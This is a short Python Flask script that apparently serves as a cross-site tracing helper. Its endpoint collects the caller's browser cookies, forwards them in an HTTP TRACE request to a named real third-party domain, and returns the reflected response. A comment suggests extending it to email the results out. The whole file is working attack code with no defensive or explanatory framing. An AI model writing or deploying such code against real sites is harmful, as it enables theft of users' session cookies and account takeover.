from flask import Flask, request, jsonify
import requests
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable CORS so your frontend can call this backend

@app.route('/trace-capture', methods=['GET'])
def trace_capture():
    # Grab cookies from the browser request headers
    cookies = request.headers.get('Cookie', '')

    # Make a TRACE request to www2.spacex.com
    trace_url = 'https://www2.spacex.com/favicon.ico'
    headers = {
        'Cookie': cookies,
        'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0')
    }
    try:
        resp = requests.request('TRACE', trace_url, headers=headers, timeout=5)
        trace_response = resp.text
    except Exception as e:
        return jsonify({'error': str(e)}), 500

    # For demo, just return the trace response (you can extend to send email here)
    return jsonify({'trace_response': trace_response})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
